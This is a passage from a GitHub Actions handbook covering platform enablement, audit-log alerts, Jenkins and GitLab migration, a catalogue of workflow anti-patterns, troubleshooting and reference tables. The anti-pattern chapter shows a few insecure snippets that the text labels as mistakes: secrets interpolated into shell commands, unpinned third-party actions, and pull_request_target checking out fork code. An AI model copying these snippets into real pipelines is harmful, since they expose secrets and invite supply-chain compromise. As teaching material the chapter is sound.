    A["Define rules<br/>actor + event + workflow path"] --> B["Evaluate mode<br/>nothing is blocked"]
    B --> C["Insights: what would have failed?"]
    C --> D{"Legitimate?"}
    D -->|"yes"| E["Add an exemption<br/>or fix the workflow"]
    D -->|"no"| F["Confirmed: rule is correct"]
    E --> G["Enforce mode"]
    F --> G
    G --> H["Manage via REST API<br/>policy as code"]
```

### 54.5 The paved road, socially

Technical enablement is the easy half. The organisational half:

- **Make the paved road genuinely easier than the alternative.** If calling your reusable workflow is 15 lines and hand-rolling is 200, adoption is automatic. If your reusable workflow is inflexible and people have to fight it, they will fork it.
- **Version it and never break `@v3`.** Downstream teams must be able to upgrade on their own schedule.
- **Publish a changelog and a migration guide** for every major version.
- **Provide an escape hatch.** Some service will legitimately need something your template does not do. Let them opt out, but require them to meet the same *outcomes* (scanning, signing, approvals) — enforced by required workflows and execution protections rather than by template uniformity.
- **Instrument adoption.** Know how many repositories are on `@v1`, `@v2`, `@v3`.
- **Own the operational burden.** If the shared workflow breaks, the platform team is on the hook for 50 teams' CI. Treat it accordingly: tests, staged rollout, monitoring.

### 54.6 Audit log and SIEM

Organisation → Settings → Audit log → streaming. Ship to Splunk, Datadog, S3, Azure Event Hubs, or an HTTPS endpoint.

Events worth alerting on:

| Event | Why |
|---|---|
| `org.update_actions_secret` / `repo.update_actions_secret` | Secret changed — who and why? |
| `environment.update_protection_rule` | Someone removed a production approval gate |
| `org.update_actions_settings` | Actions policy weakened |
| `repo.self_hosted_runner_registered` | New runner, especially on a public repo |
| `workflows.approve_workflow_job` | Who approved a production deploy |
| `oauth_application.create` / `integration_installation.create` | New app with repo access |
| `repo.access` changed to public | A private repo made public |

---

## Chapter 55 — Migrating from Jenkins and GitLab CI

### 55.1 Concept mapping

| Jenkins | GitLab CI | GitHub Actions |
|---|---|---|
| `Jenkinsfile` | `.gitlab-ci.yml` | `.github/workflows/*.yml` |
| Pipeline | Pipeline | Workflow |
| Stage | Stage | Job (with `needs:` for ordering) |
| Step | Script line | Step |
| Agent / node | Runner | Runner |
| Shared library | `include:` / components | Reusable workflow + composite action |
| Plugin | — | Action |
| Credentials plugin | CI/CD variables (masked) | Secrets + OIDC |
| `post { always { } }` | `when: always` | `if: always()` |
| `parallel { }` | parallel jobs / `parallel: matrix` | Jobs run in parallel by default; `strategy.matrix` |
| `input` step | `when: manual` | `environment:` with required reviewers |
| `stash` / `unstash` | `artifacts:` | `upload-artifact` / `download-artifact` |
| `cache` (plugin) | `cache:` | `actions/cache` |
| `cron` trigger | `schedules` | `on: schedule` |
| Multibranch pipeline | — | Native — workflows are per-ref |
| Blue Ocean | Pipeline graph | Run page job graph |

### 55.2 The GitHub Actions Importer

GitHub ships a CLI extension that audits and converts pipelines from Jenkins, GitLab, Azure DevOps, CircleCI, Travis and Bamboo.

```bash
gh extension install github/gh-actions-importer
gh actions-importer configure

# 1. Audit: what do we have, and how convertible is it?
gh actions-importer audit jenkins --output-dir ./audit

# 2. Dry run a single pipeline
gh actions-importer dry-run jenkins \
  --source-url https://jenkins.example.com/job/my-service \
  --output-dir ./dry-run

# 3. Open a PR with the converted workflow
gh actions-importer migrate jenkins \
  --source-url https://jenkins.example.com/job/my-service \
  --target-url https://github.com/my-org/my-service \
  --output-dir ./migrate
```

🧠 The audit report is the genuinely valuable part: it tells you how many pipelines you have, which plugins and constructs are unsupported, and where the manual work will be. Run it before planning the migration, not after.

The generated YAML is a starting point, not a finished product. Expect to rewrite anything involving credentials, shared libraries, or custom plugins.

### 55.3 A staged migration strategy

```mermaid
flowchart TD
    A["Phase 0: Audit<br/>inventory pipelines, plugins, credentials"] --> B["Phase 1: New repos only<br/>all new services start on Actions"]
    B --> C["Phase 2: Shadow mode<br/>run Actions alongside Jenkins,<br/>compare results, do not gate on it"]
    C --> D["Phase 3: Flip the gate<br/>Actions becomes the required check,<br/>Jenkins becomes advisory"]
    D --> E["Phase 4: Migrate deploys<br/>the scariest step — do it service by service"]
    E --> F["Phase 5: Decommission<br/>archive Jenkins, keep read-only for audit"]
```

Phase 2 is the one people skip and regret. Running both in parallel for two to four weeks surfaces every environmental difference (a tool version, a network route, a credential) without risking anything.

### 55.4 The things that will bite you

| Jenkins/GitLab habit | Problem on Actions | Fix |
|---|---|---|
| Persistent agents with pre-installed tooling and cached state | Runners are ephemeral and clean | Caching, custom runner images, or ARC with a prepared image |
| Credentials stored in the CI server, injected everywhere | Actions scopes secrets per repo/environment | OIDC, environment secrets |
| Pipelines that `ssh` into servers | Works, but is an anti-pattern | Move to pull-based deploys or a managed API |
| Long-running pipelines (multi-hour) | 6-hour job ceiling | Split into jobs; move genuinely long work off-platform |
| Groovy shared libraries with real logic | No equivalent | Composite actions + scripts in a repo |
| A single pipeline doing everything | Fights the multi-workflow model | Split by trigger and purpose (§5.5) |
| `agent { label 'build-large' }` | Different label semantics | Runner groups and labels, or larger runners |
| Manual `input` steps mid-pipeline | No mid-job pause | Split into two jobs with `environment:` approval between them |

### 55.5 Before/after example

**Jenkins:**

```groovy
pipeline {
  agent { label 'linux' }
  tools { jdk 'temurin-21'; maven 'maven-3.9' }
  stages {
    stage('Build') { steps { sh 'mvn -B clean package' } }
    stage('Test')  { steps { sh 'mvn -B verify' }
      post { always { junit '**/target/surefire-reports/*.xml' } } }
    stage('Docker') {
      steps {
        withCredentials([usernamePassword(credentialsId: 'registry', usernameVariable: 'U', passwordVariable: 'P')]) {
          sh 'docker login -u $U -p $P registry.example.com'
          sh 'docker build -t registry.example.com/api:$BUILD_NUMBER .'
          sh 'docker push registry.example.com/api:$BUILD_NUMBER'
        }
      }
    }
    stage('Deploy') {
      when { branch 'main' }
      steps { input message: 'Deploy to production?'; sh './deploy.sh' }
    }
  }
  post { failure { slackSend channel: '#ci', message: "Build failed: ${env.BUILD_URL}" } }
}
```

**GitHub Actions:**

```yaml
name: CI/CD
on:
  push: { branches: [main] }
  pull_request:

permissions:
  contents: read

jobs:
  build-test:
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '21', cache: maven }
      - run: mvn -B -ntp clean verify
      - if: always()
        uses: mikepenz/action-junit-report@v6
        with: { report_paths: '**/target/surefire-reports/TEST-*.xml' }

  image:
    needs: build-test
    if: github.event_name == 'push'
    runs-on: ubuntu-24.04
    permissions: { contents: read, packages: write, id-token: write }
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: image
    runs-on: ubuntu-24.04
    environment: production          # ← replaces the `input` step, with a real audit trail
    permissions: { contents: read, id-token: write }
    concurrency: { group: deploy-production, cancel-in-progress: false }
    steps:
      - uses: actions/checkout@v7
      - run: ./deploy.sh
        env:
          IMAGE: ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}

  notify:
    needs: [build-test, image, deploy]
    if: failure()
    runs-on: ubuntu-24.04
    steps:
      - uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "🔴 Build failed: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
```

Note what improved beyond a like-for-like translation: no stored registry password (the built-in token), a real approval gate with an audit record, deployment by digest rather than by build number, concurrency protection on the deploy, and parallel-by-default jobs.

---

## Chapter 56 — Anti-Patterns

### 56.1 The catalogue

**1. The god workflow**

One 900-line file handling PRs, main, releases, nightlies and deploys, held together by forty `if:` conditions. Unreadable, untestable, and one mistake deploys to production from a feature branch.
→ Split by trigger and purpose. Share logic with reusable workflows.

**2. Rebuilding per environment**

```yaml
deploy-staging:  { steps: [ { run: "docker build -t api:staging . && deploy staging" } ] }
deploy-prod:     { steps: [ { run: "docker build -t api:prod . && deploy prod" } ] }
```
→ You never tested what you shipped. Build once, promote the digest.

**3. Secrets in `run:` interpolation**

```yaml
- run: ./deploy.sh --token=${{ secrets.TOKEN }}
```
→ The token appears in the process list and in `set -x` output. Use `env:`.

**4. Unpinned third-party actions**

```yaml
- uses: random-person/useful-action@main
```
→ You have given a stranger write access to your pipeline, in perpetuity. Pin the SHA.

**5. `pull_request_target` + checking out PR code**

→ See §6.3. This is a full secret compromise. It is also about to be blocked by default in public repos.

**6. No timeouts**

→ A hung job burns six hours of billed minutes and a concurrency slot.

**7. `continue-on-error: true` to make a red pipeline green**

→ You have removed the check while keeping its cost. Either fix it, quarantine it explicitly with an owner and a deadline, or delete it.

**8. Caching the build output directory across branches**

```yaml
- uses: actions/cache@v6
  with: { path: target/, key: build-cache }
```
→ Stale incremental state produces failures nobody can reproduce, and a key that never changes is written once and never updated.

**9. `sleep 30` instead of waiting for a condition**

→ Either too short (flaky) or too long (slow). Poll for readiness.

**10. Job outputs carrying secrets**

→ Job outputs are **not masked**. They appear in the API and in logs.

**11. Copy-pasting the same 40 lines into 20 repos**

→ The day you need to change it, you need 20 PRs. Reusable workflows.

**12. Notifying on every event**

→ People mute the channel, then miss the one that mattered. Notify on state transitions and on production only.

**13. A required status check that a path filter can skip**

→ PRs blocked forever. Use the gate-job pattern.

**14. `if: always()` on a deploy job**

→ It will deploy after the tests failed. `always()` includes failure and cancellation.

**15. Using `latest` runner labels for reproducible production builds**

→ Your build silently moves to a new OS, new JDK patch, new Docker version. Pin the image; upgrade deliberately.

**16. 500 lines of bash inline in YAML**

→ Untestable, unreviewable, no syntax highlighting, no local execution. Move it to `scripts/`.

**17. Using the cache for something correctness depends on**

→ Caches are best-effort and get evicted. If the job breaks without it, it is an artifact.

**18. Deploying with a long-lived cloud access key stored as a secret**

→ OIDC has existed for years and is strictly better. There is rarely a good reason left.

**19. One matrix leg writing an artifact name shared with its siblings**

→ Fails in artifact v4+. Name them uniquely and merge on download.

**20. Treating the pipeline as someone else's problem**

→ Nobody owns it, it gets 20% slower every quarter, flakiness accumulates, and eventually the team routes around it entirely.

### 56.2 The five-question review checklist

When reviewing a workflow PR, ask:

1. **Permissions** — is there a top-level `permissions:` and is each job's set minimal?
2. **Untrusted input** — is any `github.event.*` value interpolated into `run:`?
3. **Pinning** — are third-party actions pinned to SHAs?
4. **Timeouts and concurrency** — every job bounded, deploys serialised and never cancelled?
5. **Failure behaviour** — what happens on failure? Are diagnostics captured? Does the right person find out?

---

## Chapter 57 — Troubleshooting Cookbook

### 57.1 "My workflow did not run at all"

```mermaid
flowchart TD
    A["Workflow did not trigger"] --> B{"Is the file in<br/>.github/workflows/ ?"}
    B -->|"no"| B1["Move it"]
    B -->|"yes"| C{"Valid YAML?<br/>Check the Actions tab<br/>for a parse error banner"}
    C -->|"no"| C1["Run actionlint"]
    C -->|"yes"| D{"Does the on: filter match?<br/>branch, path, tag, activity type"}
    D -->|"no"| D1["Fix the filter.<br/>Remember: path filters<br/>behave oddly on tags"]
    D -->|"yes"| E{"schedule / workflow_dispatch<br/>/ workflow_run ?"}
    E -->|"yes"| E1["The file must exist<br/>on the DEFAULT BRANCH"]
    E -->|"no"| F{"Commit message contains<br/>[skip ci] ?"}
    F -->|"yes"| F1["That is why"]
    F -->|"no"| G{"Was the commit pushed<br/>by GITHUB_TOKEN ?"}
    G -->|"yes"| G1["Token-made events do not<br/>trigger workflows.<br/>Use a GitHub App token"]
    G -->|"no"| H{"Are Actions disabled<br/>for the repo, or is the<br/>workflow disabled in the UI?"}
    H -->|"yes"| H1["Re-enable"]
    H -->|"no"| I{"Public repo inactive<br/>for 60 days?"}
    I -->|"yes"| I1["Scheduled workflows<br/>were auto-disabled"]
    I -->|"no"| J["Check execution protections —<br/>an actor or event rule<br/>may be blocking it"]
```

### 57.2 "Resource not accessible by integration"

The `GITHUB_TOKEN` lacks a permission.

```yaml
# Diagnose: print what you have
- run: gh api /repos/${{ github.repository }} --jq '.permissions'
  env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
```

Then add the scope. Common ones: commenting on a PR needs `pull-requests: write`; uploading SARIF needs `security-events: write`; pushing to GHCR needs `packages: write`; creating a release needs `contents: write`; reading another run's artifacts needs `actions: read`.

⚠️ Also check the organisation default is not read-only in a way that caps you, and remember job-level `permissions:` **replaces** rather than extends the workflow-level block.

### 57.3 "The cache never hits"

Check, in order:

1. **Is the key changing every run?** Print it: `echo "key=${{ runner.os }}-m2-${{ hashFiles('**/pom.xml') }}"`. If `hashFiles` returns empty, your glob matched nothing.
2. **Was the cache ever written?** The save happens in the post-step and only if the job succeeded. A job that always fails never populates the cache.
3. **Branch scoping.** A feature branch can read `main`'s cache, but not a sibling's. If `main` never runs the workflow, there is nothing to inherit.
4. **10 GB eviction.** `gh cache list --sort size_in_bytes --order desc`. If you are at the limit, your caches are being evicted.
5. **`cache-mode`.** If the workflow or job declares `cache-mode: read` or `none`, or is running under a low-trust event, writes are refused by design.
6. **Fork PRs** cannot write to the cache.

### 57.4 "It works locally but fails in CI"

| Difference | Check |
|---|---|
| Tool version | `java -version`, `node -v`, `go version` in a step vs locally |
| Environment variables | You have something in `~/.bashrc` or `~/.m2/settings.xml` that CI does not |
| Case-sensitive filesystem | macOS is case-insensitive; Linux runners are not. `import ./Utils` vs `./utils` |
| Line endings | `.gitattributes` with `* text=auto eol=lf` |
| Timezone | Runners are UTC. A test asserting local dates will fail |
| Locale | `LANG=C.UTF-8` on runners; number and date formatting differs |
| Available memory | 16 GB on a standard runner; your laptop may have more |
| Network | CI may not reach an internal host you can reach on VPN |
| Git state | Shallow clone means no history, no tags |
| Parallelism | More or fewer cores changes test interleaving and exposes races |
| Docker | Runner Docker may differ in version and storage driver |

Reproduce faithfully:

```bash
docker run --rm -it -v "$PWD:/w" -w /w ghcr.io/catthehacker/ubuntu:full-24.04 bash
```

### 57.5 "The deploy job ran even though tests failed"

You wrote a custom `if:` and lost the implicit `success()`.

```yaml
# ❌
deploy: { needs: test, if: github.ref == 'refs/heads/main' }
# ✅
deploy: { needs: test, if: success() && github.ref == 'refs/heads/main' }
```

### 57.6 "The required check never reports"

Either a path filter skipped the workflow (§28.6), or the job name changed (matrix names are part of the check name), or the job was skipped because an upstream `needs:` was skipped.

The durable fix is the single `CI Gate` job with `if: always()` (§11.4).

### 57.7 "The matrix job's output is wrong"

Matrix legs share one `outputs:` map; the last writer wins, non-deterministically.

→ Upload per-leg artifacts with unique names, then aggregate in a downstream job.

### 57.8 "Secrets are empty"

| Cause | Check |
|---|---|
| Fork PR | Secrets are deliberately unavailable. Correct behaviour |
| Environment secret, but the job has no `environment:` | Add it |
| Reusable workflow | Secrets do not inherit implicitly. Pass them or use `secrets: inherit` |
| Composite action | `secrets` is not available at all. Pass as an input |
| Typo | Secret names are case-sensitive in practice; check exact spelling |
| Wrong scope | The secret is on the org but not shared with this repository |

### 57.9 "Docker build fails with 'no space left on device'"

Standard runners have ~14 GB free. A large multi-stage build plus layer cache plus the repo can exhaust it.

```yaml
- name: Free up disk space
  run: |
    sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc \
                /usr/local/share/boost "$AGENT_TOOLSDIRECTORY"
    docker system prune -af
    df -h
```

Or use `jlumbroso/free-disk-space`, a larger runner, or trim what goes into the build context with `.dockerignore`.

### 57.10 "Exit code 143" / job killed

SIGTERM: the job was cancelled (concurrency, `fail-fast`, manual, or timeout) or the process was OOM-killed.

For the JVM:

```yaml
env:
  MAVEN_OPTS: "-Xmx3g -XX:MaxRAMPercentage=70"
  JAVA_TOOL_OPTIONS: "-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp"
```

Then capture `/tmp/*.hprof` as a failure artifact.

### 57.11 "Everything is queued"

Check: your account's concurrent job limit, a `concurrency:` group serialising more than you intended, self-hosted runners offline or mislabelled, or a GitHub Actions incident (check the status page).

```yaml
# Diagnose the labels a job is waiting for
- run: echo "Waiting for: ${{ toJSON(job) }}"
```

### 57.12 "An action suddenly stopped working"

Usually one of:
- A major version tag moved and introduced a breaking change → this is the argument for SHA pinning.
- The action's Node runtime was deprecated. **Node 20 was removed from runners in September 2026**; actions must declare `node24`. An old action that has not been updated will fail.
- The runner image changed and removed a tool the action assumed.
- The action's repository was deleted or renamed.

---
# Appendices

---

## Appendix A — Context Reference

### `github`

| Property | Description |
|---|---|
| `github.action` | The name/id of the currently running action |
| `github.action_path` | Path to a composite action's own directory |
| `github.action_ref` | The ref of the action being run |
| `github.action_repository` | `owner/repo` of the action being run |
| `github.actor` | The login that initiated the run |
| `github.actor_id` | Numeric account id |
| `github.api_url` | e.g. `https://api.github.com` |
| `github.base_ref` | PR target branch (PR events only) |
| `github.event` | The full webhook payload |
| `github.event_name` | `push`, `pull_request`, `schedule`, ... |
| `github.event_path` | Path to the payload JSON file on the runner |
| `github.graphql_url` | GraphQL endpoint |
| `github.head_ref` | PR source branch (PR events only) |
| `github.job` | The current `job_id` |
| `github.path` | Path to the `GITHUB_PATH` file |
| `github.env` | Path to the `GITHUB_ENV` file |
| `github.ref` | Full ref, e.g. `refs/heads/main` |
| `github.ref_name` | Short ref, e.g. `main` |
| `github.ref_protected` | Whether the ref is protected |
| `github.ref_type` | `branch` or `tag` |
| `github.repository` | `owner/repo` |
| `github.repository_id` | Numeric repo id |
| `github.repository_owner` | `owner` |
| `github.repository_owner_id` | Numeric owner id |
| `github.repositoryUrl` | Git URL |
| `github.retention_days` | Artifact/log retention setting |
| `github.run_attempt` | 1 on first run, increments on re-run |
| `github.run_id` | Unique id for the run |
| `github.run_number` | Per-workflow incrementing counter |
| `github.secret_source` | Where secrets came from |
| `github.server_url` | e.g. `https://github.com` |
| `github.sha` | The commit SHA (a merge commit for PR events) |
| `github.token` | The `GITHUB_TOKEN` |
| `github.triggering_actor` | Who triggered this attempt (differs on re-runs) |
| `github.workflow` | The workflow's `name:` |
| `github.workflow_ref` | `owner/repo/.github/workflows/x.yml@ref` |
| `github.workflow_sha` | Commit SHA of the workflow file |
| `github.workspace` | Absolute path to the workspace |

### `job`

| Property | Description |
|---|---|
| `job.status` | `success`, `failure`, `cancelled` |
| `job.container.id` / `.network` | Container job details |
| `job.services.<id>.id` / `.network` / `.ports` | Service container details |
| `job.workflow_ref` | 📌 Ref of the workflow file **defining this job** (differs from `github.workflow_ref` inside reusable workflows). Not on GHES |
| `job.workflow_sha` | 📌 Commit SHA of that file. Not on GHES |
| `job.workflow_repository` | 📌 `owner/repo` of that file. Not on GHES |
| `job.workflow_file_path` | 📌 Path relative to the repository root. Not on GHES |

### `runner`

| Property | Description |
|---|---|
| `runner.name` | Runner name |
| `runner.os` | `Linux`, `Windows`, `macOS` |
| `runner.arch` | `X86`, `X64`, `ARM`, `ARM64` |
| `runner.temp` | Temp directory path |
| `runner.tool_cache` | Tool cache path |
| `runner.debug` | `1` when debug logging is on |
| `runner.environment` | `github-hosted` or `self-hosted` |

### `steps`, `needs`, `strategy`, `matrix`, `inputs`, `vars`, `secrets`

| Expression | Description |
|---|---|
| `steps.<id>.outputs.<name>` | A step output |
| `steps.<id>.outcome` | Result **before** `continue-on-error` |
| `steps.<id>.conclusion` | Result **after** `continue-on-error` |
| `needs.<job>.outputs.<name>` | An upstream job output |
| `needs.<job>.result` | `success`, `failure`, `cancelled`, `skipped` |
| `strategy.fail-fast` | The configured value |
| `strategy.job-index` | 0-based index of this matrix leg |
| `strategy.job-total` | Number of legs |
| `strategy.max-parallel` | The configured value |
| `matrix.<key>` | This leg's value |
| `inputs.<name>` | `workflow_dispatch` or `workflow_call` input, correctly typed |
| `vars.<name>` | Configuration variable (env > repo > org) |
| `secrets.<name>` | A secret |
| `secrets.GITHUB_TOKEN` | The automatic token |

---

## Appendix B — Expression Function Reference

| Function | Signature | Notes |
|---|---|---|
| `contains` | `contains(search, item)` | Works on strings and arrays. Case-insensitive for strings |
| `startsWith` | `startsWith(str, prefix)` | Case-insensitive |
| `endsWith` | `endsWith(str, suffix)` | Case-insensitive |
| `format` | `format(fmt, a, b, ...)` | `{0}`, `{1}`; literal brace is `{{` |
| `join` | `join(array, sep)` | `sep` defaults to `,` |
| `toJSON` | `toJSON(value)` | Pretty-printed. The debugging workhorse |
| `fromJSON` | `fromJSON(str)` | Parse. Used for dynamic matrices and type coercion |
| `hashFiles` | `hashFiles(glob, ...)` | SHA-256 over matched file contents; empty string if nothing matched |
| `success()` | — | `if:` only. The implicit default |
| `always()` | — | `if:` only. Includes cancellation |
| `cancelled()` | — | `if:` only |
| `failure()` | — | `if:` only |

**Object filters:** `github.event.pull_request.labels.*.name` returns an array of all `name` values. Combine with `contains`.

**Useful idioms:**

```yaml
${{ inputs.x || 'default' }}                       # default value
${{ cond && 'a' || 'b' }}                          # ternary
${{ fromJSON(inputs.flag) == true }}               # string → boolean
${{ toJSON(github.event) }}                        # debug dump
${{ join(matrix.tags, ',') }}                      # array → string
${{ format('{0}-{1}', runner.os, matrix.java) }}   # interpolation
${{ contains(github.event.pull_request.labels.*.name, 'deploy') }}
${{ startsWith(github.ref, 'refs/tags/v') }}
${{ !cancelled() }}
${{ contains(needs.*.result, 'failure') }}
```

---

## Appendix C — Default Environment Variables

| Variable | Description |
|---|---|
| `CI` | Always `true` |
| `GITHUB_ACTION` | Current action id |
| `GITHUB_ACTION_PATH` | Composite action directory |
| `GITHUB_ACTIONS` | Always `true` |
| `GITHUB_ACTOR` | Initiating login |
| `GITHUB_API_URL` | API base URL |
| `GITHUB_BASE_REF` | PR base branch |
| `GITHUB_ENV` | Path to the env file |
| `GITHUB_EVENT_NAME` | Event name |
| `GITHUB_EVENT_PATH` | Path to the payload JSON |
| `GITHUB_GRAPHQL_URL` | GraphQL endpoint |
| `GITHUB_HEAD_REF` | PR head branch |
| `GITHUB_JOB` | Current job id |
| `GITHUB_OUTPUT` | Path to the output file |
| `GITHUB_PATH` | Path to the PATH file |
| `GITHUB_REF` | Full ref |
| `GITHUB_REF_NAME` | Short ref |
| `GITHUB_REF_PROTECTED` | Protected ref flag |
| `GITHUB_REF_TYPE` | `branch` or `tag` |
| `GITHUB_REPOSITORY` | `owner/repo` |
| `GITHUB_REPOSITORY_OWNER` | `owner` |
| `GITHUB_RUN_ATTEMPT` | Attempt number |
| `GITHUB_RUN_ID` | Run id |
| `GITHUB_RUN_NUMBER` | Run number |
| `GITHUB_SERVER_URL` | Server URL |
| `GITHUB_SHA` | Commit SHA |
| `GITHUB_STEP_SUMMARY` | Path to the summary file |
| `GITHUB_TRIGGERING_ACTOR` | Actor for this attempt |
| `GITHUB_WORKFLOW` | Workflow name |
| `GITHUB_WORKFLOW_REF` | Workflow ref |
| `GITHUB_WORKFLOW_SHA` | Workflow file SHA |
| `GITHUB_WORKSPACE` | Workspace path |
| `RUNNER_ARCH` | `X64`, `ARM64`, ... |
| `RUNNER_DEBUG` | `1` when debug logging is enabled |
| `RUNNER_ENVIRONMENT` | `github-hosted` / `self-hosted` |
| `RUNNER_NAME` | Runner name |
| `RUNNER_OS` | `Linux`, `Windows`, `macOS` |
| `RUNNER_TEMP` | Temp directory |
| `RUNNER_TOOL_CACHE` | Tool cache directory |
| `ACTIONS_ID_TOKEN_REQUEST_URL` | OIDC token endpoint (with `id-token: write`) |
| `ACTIONS_ID_TOKEN_REQUEST_TOKEN` | OIDC request bearer token |

⚠️ You cannot define an env var starting with `GITHUB_`. Use your own prefix.

---

## Appendix D — Workflow Command Reference

```bash
# Logging
echo "::debug::message"                  # only shown with ACTIONS_STEP_DEBUG=true
echo "::notice::message"
echo "::warning::message"
echo "::error::message"

# Annotations with location
echo "::error file=app.js,line=10,col=5,endLine=12,endColumn=20,title=Bug::Message"
echo "::warning file=pom.xml,line=88::Message"
echo "::notice file=README.md,line=1,title=Docs::Message"

# Grouping
echo "::group::Group title"
echo "inside"
echo "::endgroup::"

# Masking
echo "::add-mask::value-to-hide"

# Pause command processing while echoing untrusted content
echo "::stop-commands::RANDOM_TOKEN_HERE"
cat untrusted.txt
echo "::RANDOM_TOKEN_HERE::"

# Environment files (the modern replacements for ::set-output / ::set-env)
echo "name=value"           >> "$GITHUB_OUTPUT"
echo "NAME=value"           >> "$GITHUB_ENV"
echo "/path/to/bin"         >> "$GITHUB_PATH"
echo "## Markdown heading"  >> "$GITHUB_STEP_SUMMARY"

# Multiline values
{
  echo "body<<EOF_MARKER"
  cat notes.md
  echo "EOF_MARKER"
} >> "$GITHUB_OUTPUT"
```

---

## Appendix E — Action Versions Used in This Guide

Verified against the actions' released tags in **September 2026**. These move quickly; always check for a newer major before copying, and pin third-party actions to SHAs in production.

| Action | Major used here |
|---|---|
| `actions/checkout` | `v7` |
| `actions/setup-java` | `v6` |
| `actions/setup-go` | `v7` |
| `actions/setup-node` | `v7` |
| `actions/setup-python` | `v7` |
| `actions/cache` | `v6` |
| `actions/upload-artifact` | `v7` |
| `actions/download-artifact` | `v8` |
| `actions/github-script` | `v9` |
| `actions/attest-build-provenance` | `v4` |
| `actions/attest-sbom` | `v3` |
| `actions/create-github-app-token` | `v2` |
| `actions/dependency-review-action` | `v4` |
| `actions/labeler` | `v5` |
| `actions/stale` | `v9` |
| `actions/delete-package-versions` | `v5` |
| `github/codeql-action` | `v4` |
| `docker/build-push-action` | `v7` |
| `docker/login-action` | `v4` |
| `docker/setup-buildx-action` | `v4` |
| `docker/setup-qemu-action` | `v4` |
| `docker/metadata-action` | `v6` |
| `aws-actions/configure-aws-credentials` | `v6` |
| `aws-actions/amazon-ecr-login` | `v2` |
| `google-github-actions/auth` | `v3` |
| `azure/login` | `v3` |
| `azure/setup-helm` | `v4` |
| `hashicorp/setup-terraform` | `v4` |
| `sigstore/cosign-installer` | `v4` |
| `aquasecurity/trivy-action` | `0.36.0` |
| `anchore/sbom-action` | `v0` |
| `gitleaks/gitleaks-action` | `v2` |
| `step-security/harden-runner` | `v2` |
| `dorny/paths-filter` | `v4` |
| `peter-evans/create-pull-request` | `v8` |
| `softprops/action-gh-release` | `v3` |
| `slackapi/slack-github-action` | `v4` |
| `gradle/actions/setup-gradle` | `v6` |
| `codecov/codecov-action` | `v7` |
| `mikepenz/action-junit-report` | `v6` |
| `amannn/action-semantic-pull-request` | `v6` |
| `googleapis/release-please-action` | `v4` |
| `golangci/golangci-lint-action` | `v8` |
| `dependabot/fetch-metadata` | `v2` |
| `nick-fields/retry` | `v3` |
| `mxschmitt/action-tmate` | `v3` |

Check the current major for any action with:

```bash
git ls-remote --tags --refs https://github.com/OWNER/REPO \
  | awk -F'refs/tags/' '{print $2}' \
  | grep -E '^v?[0-9]+\.[0-9]+\.[0-9]+$' | sed 's/^v//' \
  | sort -t. -k1,1n -k2,2n -k3,3n | tail -1
```

### Platform facts current as of September 2026

- `ubuntu-latest` now points to **Ubuntu 26.04**, GA on both x64 and arm64.
- `ubuntu-22.04` began deprecation on 2026-09-17 and is fully unsupported from 2027-04-17.
- **Node 20 was removed from runners on 2026-09-16.** Actions must declare `using: node24`.
- Cron schedules support an IANA `timezone:` field.
- Service containers support `entrypoint:` and `command:` overrides.
- Environments support `deployment: false` to use secrets/variables without creating a Deployment record.
- `cache-mode: read | write | none` is available at workflow and job level; it is enforced by the cache service and cannot be widened by a called reusable workflow.
- `GITHUB_TOKEN` supports a `vulnerability-alerts` permission (read Dependabot alerts).
- The `job` context exposes `workflow_ref`, `workflow_sha`, `workflow_repository`, `workflow_file_path` (not on GHES).
- OIDC tokens can carry **repository custom properties** as claims.
- Custom images for GitHub-hosted runners are GA.
- A runner scale set client (Go module) supports custom autoscaling without Kubernetes.
- Workflow runs are limited to **50 reruns**.
- **Workflow execution protections** are GA, with workflow file targeting, Insights, and a REST API. A default rule blocking `pull_request_target` in public repositories becomes enforced on **2 November 2026**.

---

## Appendix F — Glossary

| Term | Meaning |
|---|---|
| **Action** | A reusable unit of work, invoked with `uses:`. A repo containing `action.yml` |
| **Annotation** | A message attached to a file/line, shown inline in the PR diff |
| **ARC** | Actions Runner Controller — Kubernetes operator for autoscaling self-hosted runners |
| **Artifact** | A file or set of files persisted from a workflow run |
| **Attestation** | A signed statement about an artifact (provenance, SBOM) |
| **Composite action** | An action implemented as a sequence of steps |
| **Concurrency group** | A string; runs sharing it are serialised or cancelled |
| **Context** | A data object available in expressions (`github`, `needs`, ...) |
| **DAG** | The directed acyclic graph of jobs formed by `needs:` |
| **Digest** | The immutable content hash of a container image (`sha256:...`) |
| **Environment** | A named deployment target with its own secrets and protection rules |
| **Ephemeral runner** | A runner that executes one job then deregisters |
| **Event** | Something that happened in the repository, carrying a payload |
| **Expression** | `${{ ... }}` evaluated by the Actions engine |
| **GHCR** | GitHub Container Registry, `ghcr.io` |
| **`GITHUB_TOKEN`** | A short-lived, repo-scoped token minted per job |
| **Job** | A set of steps running on one runner |
| **Matrix** | A strategy expanding one job definition into many parallel jobs |
| **Merge group** | A speculative merge built by the merge queue |
| **OIDC** | OpenID Connect — short-lived federated tokens for cloud authentication |
| **Provenance** | A signed record of how an artifact was built |
| **Pwn request** | The `pull_request_target` attack that executes fork code with secrets |
| **Reusable workflow** | A workflow callable from another workflow via `workflow_call` |
| **Runner** | The machine that executes a job |
| **SARIF** | Static Analysis Results Interchange Format — how scanners report to Code Scanning |
| **SBOM** | Software Bill of Materials |
| **SLSA** | Supply-chain Levels for Software Artifacts, a provenance framework |
| **Step** | One unit of work in a job: `run:` or `uses:` |
| **Step summary** | Markdown written to `$GITHUB_STEP_SUMMARY`, rendered on the run page |
| **Workflow** | A YAML file in `.github/workflows/` |
